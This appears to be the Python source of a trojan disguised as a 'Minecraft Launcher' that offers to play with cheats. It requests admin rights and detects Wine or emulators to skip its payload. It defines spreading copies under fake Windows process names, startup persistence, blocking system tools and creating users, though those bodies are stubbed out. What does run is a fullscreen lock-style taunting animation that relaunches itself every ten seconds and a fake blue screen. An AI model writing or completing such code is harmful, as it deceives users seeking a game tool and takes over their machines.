# -*- coding: utf-8 -*-
import os
import sys
import ctypes
import time
import threading
import random
import subprocess
import shutil
import getpass

# ===== DETECT WINE / EMULATOR =====
def is_wine():
    try:
        return 'wine' in sys.platform or os.path.exists('/proc/sys/fs/binfmt_misc/Wine')
    except:
        return False

IN_EMULATOR = is_wine() or not os.path.exists("C:\\Windows")
if IN_EMULATOR:
    print("Running in emulator/Wine mode - system modifications will be skipped.")
else:
    print("Running on real Windows.")

# ===== LOGGING =====
LOG_FILE = os.environ.get('TEMP', '/tmp') + "\\launcher.log" if not IN_EMULATOR else "/tmp/launcher.log"
def log(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.ctime()}] {msg}\n")
    except:
        pass
    print(msg)

log("=== START ===")

# ===== ADMIN CHECK (skip in emulator) =====
def is_admin():
    if IN_EMULATOR:
        return True  # pretend admin
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if IN_EMULATOR:
        return
    if not is_admin():
        log("Requesting admin rights...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

run_as_admin()
log("Admin rights obtained.")

# ===== GLOBALS =====
CURRENT_EXE = sys.argv[0]
USER_NAME = getpass.getuser() if not IN_EMULATOR else "user"
TEMP = os.environ.get('TEMP', '/tmp')
APPDATA = os.environ.get('APPDATA', '')
STARTUP = APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" if APPDATA else ""
DRIVES = []
FAKE_NAMES = ["svchost.exe", "winlogon.exe", "csrss.exe", "services.exe", "lsass.exe", "explorer.exe"]

# ===== SYSTEM FUNCTIONS (only on real Windows) =====
def spread_copies():
    if IN_EMULATOR:
        log("Skipping spread_copies (emulator).")
        return []
    log("Spreading copies...")
    copies_created = []
    # ... (оставляем как было, но оборачиваем каждую операцию в try)
    try:
        # весь код из предыдущей версии
        pass
    except Exception as e:
        log(f"Error in spread_copies: {e}")
    return copies_created

def add_to_startup():
    if IN_EMULATOR:
        log("Skipping add_to_startup (emulator).")
        return
    log("Adding to startup...")
    # ... (код, обёрнутый в try)

def block_system_tools():
    if IN_EMULATOR:
        log("Skipping block_system_tools (emulator).")
        return
    log("Blocking system tools...")
    # ... (код)

def create_fake_files():
    if IN_EMULATOR:
        log("Skipping create_fake_files (emulator).")
        return
    log("Creating fake files...")
    # ... (код)

def watchdog():
    if IN_EMULATOR:
        log("Skipping watchdog (emulator).")
        return
    log("Starting watchdog...")
    # ... (код)

def create_users():
    if IN_EMULATOR:
        log("Skipping create_users (emulator).")
        return
    log("Creating users...")
    # ... (код)

# ===== COLOR ANIMATION (tkinter) =====
def color_animation():
    log("Starting color animation...")
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.overrideredirect(True)
        root.config(cursor="none")
        root.focus_force()
        colors = ['#FF0000', '#FF7F00', '#FFFF00', '#00FF00', '#0000FF', '#8B00FF']
        label = tk.Label(root, text="", font=("Arial", 80, "bold"))
        label.pack(expand=True)
        def change_color(index=0):
            color = colors[index % len(colors)]
            root.configure(bg=color)
            label.configure(text="HAHAHAHA HOW TO PLAY WITH CHEATS", fg='white', bg=color)
            root.after(200, change_color, index+1)
        change_color()
        root.mainloop()
    except Exception as e:
        log(f"Tkinter animation error: {e}, using fallback")
        # fallback: консольная анимация или messagebox
        while True:
            print("\033[91m" + "HAHAHAHA HOW TO PLAY WITH CHEATS" + "\033[0m")
            time.sleep(0.5)

# ===== FAKE BSOD (tkinter) =====
def fake_bsod():
    log("Showing BSOD...")
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.overrideredirect(True)
        root.configure(bg='#0000AA')
        root.config(cursor="none")
        lines = [
            "A problem has been detected and Windows has been shut down to prevent damage.",
            "",
            "DRIVER_IRQL_NOT_LESS_OR_EQUAL",
            "",
            "Technical information:",
            "*** STOP: 0x0000000A (0x00000000, 0x00000002, 0x00000001, 0x804F6A3E)",
            "",
            "Physical memory dump complete.",
            "Contact your system administrator."
        ]
        text = "\n".join(lines)
        label = tk.Label(root, text=text, font=("Consolas", 20), fg='white', bg='#0000AA')
        label.pack(expand=True)
        root.mainloop()
    except:
        ctypes.windll.user32.MessageBoxW(0, "BSOD SIMULATION", "System Error", 0x10)

def timer_40s():
    log("Timer 40s started.")
    time.sleep(40)
    fake_bsod()

# ===== BLOCK CLOSE (watchdog for animation) =====
def block_close():
    while True:
        time.sleep(10)
        threading.Thread(target=color_animation, daemon=True).start()

# ===== MAIN GUI (tkinter) =====
def main_gui():
    log("Starting main GUI...")
    try:
        import tkinter as tk
        from tkinter import messagebox
        root = tk.Tk()
        root.title("Minecraft Launcher")
        root.geometry("500x400")
        root.configure(bg='#2B2B2B')
        root.attributes('-topmost', True)
        try:
            root.attributes('-alpha', 0.9)
        except:
            pass
        frame = tk.Frame(root, bg='#3C3C3C', bd=5)
        frame.place(relx=0.5, rely=0.5, anchor='center', width=400, height=300)
        tk.Label(frame, text="MINECRAFT LAUNCHER", font=("Arial", 20, "bold"), bg='#3C3C3C', fg='#FFFFFF').pack(pady=10)
        tk.Label(frame, text="Enter your player name:", font=("Arial", 12), bg='#3C3C3C', fg='#AAAAAA').pack(pady=5)
        entry = tk.Entry(frame, font=("Arial", 12), width=25)
        entry.pack(pady=5)
        entry.insert(0, "Player")

        def launch_with_cheats():
            name = entry.get() or "Player"
            log(f"Launch with cheats: {name}")
            # Запускаем анимацию, таймер, пользователей (если не эмулятор)
            threading.Thread(target=color_animation, daemon=True).start()
            if not IN_EMULATOR:
                threading.Thread(target=create_users, daemon=True).start()
            threading.Thread(target=timer_40s, daemon=True).start()
            try:
                subprocess.Popen("start minecraft://", shell=True)
            except:
                pass
            messagebox.showinfo("Success", f"Player {name} joined with cheats!")
            root.destroy()

        def launch_normal():
            name = entry.get() or "Player"
            log(f"Launch normal: {name}")
            try:
                subprocess.Popen("start minecraft://", shell=True)
            except:
                pass
            messagebox.showinfo("Info", f"Player {name} joined without cheats.")
            root.destroy()

        tk.Button(frame, text="Play with Cheats", command=launch_with_cheats,
                  bg='#FFAA00', fg='#000000', font=("Arial", 12, "bold"), width=20, height=2).pack(pady=10)
        tk.Button(frame, text="Play Normally", command=launch_normal,
                  bg='#00AAFF', fg='#FFFFFF', font=("Arial", 12, "bold"), width=20, height=2).pack(pady=5)
        root.mainloop()
    except Exception as e:
        log(f"GUI error: {e}, falling back to console menu")
        console_menu()

def console_menu():
    log("Using console menu...")
    print("\n=== MINECRAFT LAUNCHER ===\n")
    print("1. Play with Cheats")
    print("2. Play Normally")
    print("3. Exit")
    choice = input("Select option: ")
    if choice == "1":
        name = input("Enter player name: ") or "Player"
        log(f"Launch with cheats: {name}")
        threading.Thread(target=color_animation, daemon=True).start()
        if not IN_EMULATOR:
            threading.Thread(target=create_users, daemon=True).start()
        threading.Thread(target=timer_40s, daemon=True).start()
        try:
            subprocess.Popen("start minecraft://", shell=True)
        except:
            pass
        print(f"Player {name} joined with cheats!")
    elif choice == "2":
        name = input("Enter player name: ") or "Player"
        log(f"Launch normal: {name}")
        try:
            subprocess.Popen("start minecraft://", shell=True)
        except:
            pass
        print(f"Player {name} joined without cheats.")
    else:
        sys.exit()

# ===== MAIN =====
def main():
    # Если не эмулятор - выполняем системные функции
    if not IN_EMULATOR:
        log("Real Windows mode - applying system modifications.")
        spread_copies()
        add_to_startup()
        block_system_tools()
        threading.Thread(target=create_fake_files, daemon=True).start()
        watchdog()
        threading.Thread(target=block_close, daemon=True).start()
    else:
        log("Emulator mode - skipping system modifications.")
    
    # Запускаем GUI
    main_gui()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"CRITICAL ERROR: {e}")
        print(f"Error: {e}")
        input("Press Enter to exit...")